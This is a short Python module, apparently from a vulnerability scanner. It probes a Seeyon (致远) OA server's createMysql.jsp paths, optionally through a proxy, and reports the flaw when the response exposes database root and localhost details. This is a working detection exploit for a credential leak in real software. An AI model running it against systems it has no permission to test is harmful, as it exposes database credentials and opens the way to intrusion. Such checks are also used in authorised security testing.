import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
iaq=0
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia,iaq
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        logging.captureWarnings(True)
        uiaq=['yyoa/createMysql.jsp','yyoa/ext/createMysql.jsp']
        for i in uiaq:
            gf = requests.get(url+i,cookies=s_cookie,headers=headers,proxies=proxies,verify=False,timeout=5)
            if 'root' in gf.text and 'localhost' in gf.text:
                uia+= '[+]漏洞存在:\n'+i+'\n'
                iaq+=1
            if iaq!=0:
                iaq*=0
            else:
                uia = '[-]漏洞不存在'
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 致远OA createMysql.jsp 数据库敏感信息泄]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)